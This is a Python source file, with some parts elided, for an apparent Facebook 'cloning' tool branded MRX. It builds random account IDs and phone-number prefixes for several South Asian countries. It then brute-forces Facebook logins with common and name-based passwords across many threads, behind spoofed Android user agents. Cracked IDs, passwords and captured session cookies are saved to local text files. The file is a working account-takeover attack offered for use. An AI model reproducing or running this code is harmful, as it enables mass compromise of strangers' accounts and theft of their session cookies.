...
os.system('clear')
print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING MODULES ')
try:
    import requests 
except ImportError:
...
get_ua_list = requests.get("https://raw.githubusercontent.com/KGF-420/ua/main/kgfua.txt").text.splitlines()
...
model2 = requests.get('https://gist.githubusercontent.com/REFAT-156/ce32dac4fd13dc22eb94c9ef5003300f/raw/8b89908acc56beabce9eb329e7873e8e58702515/').text.splitlines()   
def Mrxua():
    END = '[FBAN/FB4A;FBAV/12.0.0.1967;FBBV/4885688;[FBAN/FB4A;FBAV/196.0.0.61;FBBV/555333754;FBDM/{density=2.625,width=1080,height=2131};FBLC/zh_CN;FBRV/688585642;FBCR/ZONG;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A510Y;FBSV/12.1.1;nullFBCA/armeabi-v7a:armeabi;]'
...
sys.stdout.write('\x1b]2; MRX\x07')
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
#__________________[ COLOUR ]__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[38;5;46m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';P = '\033[1;36m';O = '\033[38;5;46m'
#__________________[ LINEX ]__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'\033[38;5;46m──────────────────────────────────────────────────')
...
logo=f"""\033[1;34m
 ...
 ______| __|__ |_____ |______ |  \_|    |        
                                        (FREE)             
\033[38;5;46m──────────────────────────────────────────────────
\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] AUTHOR    : MRX EWAN XABAT
\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] OWNER     : MRX EWAN XABAT
\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] SUPPORT   : \033[38;5;46m64BIT x 32BIT
\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] TOOLS     : \033[38;5;46mFILE x RANDOM x OLD CLONE
\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] VERSION   : \033[38;5;46mTESTING
\033[38;5;46m──────────────────────────────────────────────────"""
#__________________[ RESULT ]__________________#
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f'\r\033[38;5;46m──────────────────────────────────────────────────')
        print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] THE PROCESS HAS BEEN COMPLETE...')
        print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] TOTAL OK \033[38;5;46m:\033[38;5;46m %s' % str(len(oks)))
        print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] TOTAL CP \033[38;5;46m:\033[38;5;46m %s' % str(len(cps)))
        print(f'\r\033[38;5;46m──────────────────────────────────────────────────')
        input(f"\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] PRESS ENTER TO BACK MENU ")
        exit()
#__________________[ MENU ]__________________#
def menu():   
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m1\033[38;5;46m] FILE CLONING')
    print(f'\033[38;5;46m[\033[38;5;46m2\033[38;5;46m] RANDOM CLONING')
    print(f'\033[38;5;46m[\033[38;5;46m3\033[38;5;46m] OLD IDS CLONING')
    print(f'\033[38;5;46m[\033[38;5;46m4\033[38;5;46m] CONTACT TOOL OWNER')
#    print(f'\033[38;5;46m[\033[38;5;46m5\033[38;5;46m] OWNER FACEBOOK ID')
 #   print(f'\033[38;5;46m[\033[38;5;46m6\033[38;5;46m] JOIN MASSANGER GROUP')
    print(f'\033[38;5;46m[\033[38;5;46m0\033[38;5;46m] EXIT TOOLS')
    linex()
    select = input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE \033[38;5;46m:\033[38;5;46m ')
    if select =='1':
        _file_()
    elif select =='2':
        _randm_()
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100000687634445');menu()
#    elif select =='5':
 #       os.system('xdg-open https://www.facebook.com/profile.php?id=100057497148585');menu()
 #   elif select =='6':
  #      os.system('xdg-open https://m.me/j/AbbJPGE906LDe1tD/');menu()
    elif select =='0':
        exit(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXIT DONE ')
    else:
...
def _old_():
       clear()
       print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE : \033[38;5;46m3000\033[38;5;46m|\033[38;5;46m5000\033[38;5;46m|\033[38;5;46m10000\033[38;5;46m|\033[38;5;46m99999');linex()
       limit=input(f"\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] INPUT : ")
       clear()
       print(f'\033[38;5;46m[\033[38;5;46m1\033[38;5;46m] METHOD \033[38;5;46m[\033[38;5;46mBEST-API\033[38;5;46m] \033[38;5;46m')
       linex()
       ask=input(f"\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] INPUT : ")
       if ask in["1"]:
          star="10000"
       ...
       with Bikash(max_workers=40) as MRX:
           clear()
           print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] TOTAL ID : {limit} ')
           print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] METHOD   : M\033[38;5;46m-\033[38;5;46m{ask}')
           print(f'\x1b[38;5;46m[\x1b[38;5;46m=\x1b[38;5;46m] FIRST \033[1;37m[\033[38;5;196mON\033[1;97m|\033[38;5;196mOFF\033[1;37m] \033[38;5;46mAIRPLANE MODE FOR SPEED');linex()
           for mal in user:
              uid=star+mal
              MRX.submit(login,uid)
...
def login(uid):
    ...
    try:
        sys.stdout.write(f"\r\033[38;5;46m[\033[38;5;46mMRX-FIND\033[38;5;46m] \033[38;5;46m{loop}\033[38;5;46m \033[38;5;46m|\033[38;5;46m OK\033[38;5;46m|\033[38;5;46mCP \033[38;5;46m|\033[38;5;46m \033[38;5;46m{len(oks)}|\033[38;5;46m{len(cp)} ")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            ...
            if "session_key" in rp:
                print(f"\r\033[38;5;46m[\033[38;5;46mMRX-CP\033[38;5;46m]\033[38;5;46m {uid} | {pw}")
                open("/sdcard/MRX.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:          
            	print(f"\r\033[38;5;46m[\033[38;5;46mMRX-LIVE\033[38;5;46m]\033[38;5;46m {uid} | {pw}")
            	open("/sdcard/MRX-OLD.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            elif "Please Confirm Email" in str(rp):            
            	print(f"\r\033[38;5;46m[\033[38;5;46mMRX-LIVE\033[38;5;46m]\033[38;5;46m {uid} | {pw}")
            	open("/sdcard/MRX-LIVE.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            else:continue
        loop+=1
...
def _randm_():   
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m1\033[38;5;46m] BANGLADESH CLONING')
    print(f'\033[38;5;46m[\033[38;5;46m2\033[38;5;46m] NEPAL CLONING')
    print(f'\033[38;5;46m[\033[38;5;46m3\033[38;5;46m] INDIAN CLONING')
    print(f'\033[38;5;46m[\033[38;5;46m4\033[38;5;46m] PAKISTAN CLONING')
    print(f'\033[38;5;46m[\033[38;5;46m5\033[38;5;46m] MALAYSIA CLONING')
    print(f'\033[38;5;46m[\033[38;5;46m6\033[38;5;46m] AFGHANISTAN CLONING')
    print(f'\033[38;5;46m[\033[38;5;46m0\033[38;5;46m] BACK TO MAIN MENU')
    linex()
    select = input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE \033[38;5;46m:\033[38;5;46m ')
    if select =='1':
        _bd_()
...
def _bd_():
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m 017\033[38;5;46m/\033[38;5;46m019\033[38;5;46m/\033[38;5;46m018\033[38;5;46m/\033[38;5;46m016');linex()
    code = input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE  \033[38;5;46m:\033[38;5;46m ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m 3000\033[38;5;46m/\033[38;5;46m5000\033[38;5;46m/\033[38;5;46m10000\033[38;5;46m/\033[38;5;46m99999');linex()
    limit = int(input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE  \033[38;5;46m:\033[38;5;46m '))
    ...
    with Bikash(max_workers=30) as sexy:
        clear()
        print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] SIM CODE  \033[38;5;46m:\033[38;5;46m {code}')
        print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] TOTAL UID \033[38;5;46m:\033[38;5;46m {str(len(user))}')
        print(f'\x1b[38;5;46m[\x1b[38;5;46m=\x1b[38;5;46m] FIRST \033[1;37m[\033[38;5;196mON\033[1;97m|\033[38;5;196mOFF\033[1;37m] \033[38;5;46mAIRPLANE MODE FOR SPEED');linex()
        for love in user:
    ...
    print('')
    print(f'\r\033[38;5;46m──────────────────────────────────────────────────')
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] THE PROCESS HAS BEEN COMPLETED')
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] TOTAL OK ID \033[38;5;46m:\033[38;5;46m {str(len(ok))}')
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] TOTAL CP ID \033[38;5;46m:\033[38;5;46m {str(len(cp))}')
    print(f'\r\033[38;5;46m──────────────────────────────────────────────────')
    input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] PRESS ENTER TO BACK ')
    menu()
#__________________[ NEPAL ]__________________#
def _Nepal_():
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m 9823\033[38;5;46m/\033[38;5;46m9818\033[38;5;46m/\033[38;5;46m9810\033[38;5;46m/\033[38;5;46m9742 ');linex()
    code = input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE  \033[38;5;46m:\033[38;5;46m ')
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m 3000\033[38;5;46m/\033[38;5;46m5000\033[38;5;46m/\033[38;5;46m10000\033[38;5;46m/\033[38;5;46m99999');linex()
    limit = int(input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE  \033[38;5;46m:\033[38;5;46m '))
...
def _India_():
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m +91639\033[38;5;46m/\033[38;5;46m+91934\033[38;5;46m/\033[38;5;46m+91901\033[38;5;46m/\033[38;5;46m+91914 ');linex()
    code = input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE  \033[38;5;46m:\033[38;5;46m ')
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m 3000\033[38;5;46m/\033[38;5;46m5000\033[38;5;46m/\033[38;5;46m10000\033[38;5;46m/\033[38;5;46m99999');linex()
    limit = int(input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE  \033[38;5;46m:\033[38;5;46m '))
...
def _Pk_():
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m 0300\033[38;5;46m/\033[38;5;46m0303\033[38;5;46m/\033[38;5;46m0302\033[38;5;46m/\033[38;5;46m0306 ');linex()
    code = input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE  \033[38;5;46m:\033[38;5;46m ')
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m 3000\033[38;5;46m/\033[38;5;46m5000\033[38;5;46m/\033[38;5;46m10000\033[38;5;46m/\033[38;5;46m99999');linex()
    limit = int(input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE  \033[38;5;46m:\033[38;5;46m '))
...
def _Malaysia_():
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m 011\033[38;5;46m/\033[38;5;46m012\033[38;5;46m/\033[38;5;46m013\033[38;5;46m/\033[38;5;46m010 ');linex()
    code = input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE  \033[38;5;46m:\033[38;5;46m ')
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m 3000\033[38;5;46m/\033[38;5;46m5000\033[38;5;46m/\033[38;5;46m10000\033[38;5;46m/\033[38;5;46m99999');linex()
    limit = int(input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE  \033[38;5;46m:\033[38;5;46m '))
...
def _Afg_():
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m +9330\033[38;5;46m/\033[38;5;46m+9340\033[38;5;46m/\033[38;5;46m+9350\033[38;5;46m/\033[38;5;46m+9360 ');linex()
    code = input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE  \033[38;5;46m:\033[38;5;46m ')
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m 3000\033[38;5;46m/\033[38;5;46m5000\033[38;5;46m/\033[38;5;46m10000\033[38;5;46m/\033[38;5;46m99999');linex()
    limit = int(input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE  \033[38;5;46m:\033[38;5;46m '))
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self,sid,name,psw):
        try:
            ...
            sys.stdout.write(f"\r\033[38;5;46m[\033[38;5;46mMRX-M2\033[38;5;46m] \033[38;5;46m{loop}\033[38;5;46m \033[38;5;46m|\033[38;5;46m BUHAT\033[38;5;46m|\033[38;5;46mPATAY \033[38;5;46m{len(BUHAY)}\033[38;5;46m|\033[38;5;46m{len(PATAY)}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r\033[38;5;46m[BUHAY-LIVE] {sid} | {ps} ")
                    print(f"\r\r\033[38;5;46m[COOKIES-BUHAY]<>{O}{cookie} ")
                    open('/sdcard/BUHAY-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[PATAY-CP] {sid} | {ps} ")
                    open('/sdcard/PATAY-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
    ...
    def methodC(self,sid,name,psw):
        try:
            ...
            mcc = random.choice(['SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F', 'SM-T575', 'SM-A516V', 'SM-M017F', 'SM-J260GU', 'SM-J260GU', 'SM-J260FU', 'SM-J260MU', 'SM-A716F', 'SM-A716F', 'SM-A716F', 'SM-A7160', 'SM-A716B', 'SM-A716U', 'SM-A716B', 'SM-M115F', 'SM-M115F', 'SM-M115M', 'SM-M115M', 'SM-G988', 'SM-G988U', 'SM-G988U1', 'SM-G9880', 'SM-G988B', 'SM-G988N', 'SM-G988B', 'SM-T927A', 'SM-T920', 'SM-A305F', 'SM-A305FN', 'SM-A305G', 'SM-A305GN', 'SM-A305YN', 'SM-A3050', 'SM-A305N', 'SM-A305GT', 'SM-A105F', 'SM-A105G', 'SM-A105M', 'SM-A105FN', 'SM-A920F', 'SM-A9200', 'SM-A920N', 'SM-A920X', 'SM-N960F', 'SM-N9600', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960N', 'SM-N960W', 'SM-N960X', 'SCV40'])
            uai = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(40,200))+'.0.0.'+str(random.randint(1,66))+'.117;FBBV/308613358;FBDM/{density=2.0,width=720,height=1440};FBLC/it_IT;FBRV/'+str(random.randint(111111111,666666666))+';FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(mcc)+';FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            sys.stdout.write(f"\r\033[38;5;46m[\033[38;5;46mMRX-M3\033[38;5;46m] \033[38;5;46m{loop}\033[38;5;46m \033[38;5;46m|\033[38;5;46m OK\033[38;5;46m|\033[38;5;46mCP \033[38;5;46m{len(oks)}\033[38;5;46m|\033[38;5;46m{len(cps)}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);MRXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={MRXb};{ckkk}"
                    print(f"\r\r\033[38;5;46m[MRX-LIVE] {sid} | {ps} ")
                    print(f"\r\r\033[38;5;46m[COOKIES-💥]<>{O}{cookie} ")
                    open('/sdcard/MRX-M3-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[MRX-CP] {sid} | {ps} ")
                    open('/sdcard/MRX-M3-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
def randm(ids,psd):
    ...
    sys.stdout.write(f"\r\033[38;5;46m[\033[38;5;46mMRX-FIND\033[38;5;46m] \033[38;5;46m{loop}\033[38;5;46m \033[38;5;46m|\033[38;5;46m OK\033[38;5;46m|\033[38;5;46mCP \033[38;5;46m|\033[38;5;46m \033[38;5;46m{len(ok)}|\033[38;5;46m{len(cp)} ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);MRXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={MRXb};{ckkk}"
                print(f'\r\r\033[38;5;46m[MRX-LIVE] {uid} | {pas}')
                print(f'\r\r\033[38;5;46m[COOKIE]\033[38;5;46m {cookie}')
                open('/sdcard/MRX-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                ok.append(uid)
                break
            elif 'www.facebook.com' in q['error']['message']:
                print(f"\r\r{M}[MRX-CP] {uid} | {pas} ")
                open('/sdcard/MRX-RNDM-CP.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                cps.append(uid)
            else:     
                continue
        loop+=1
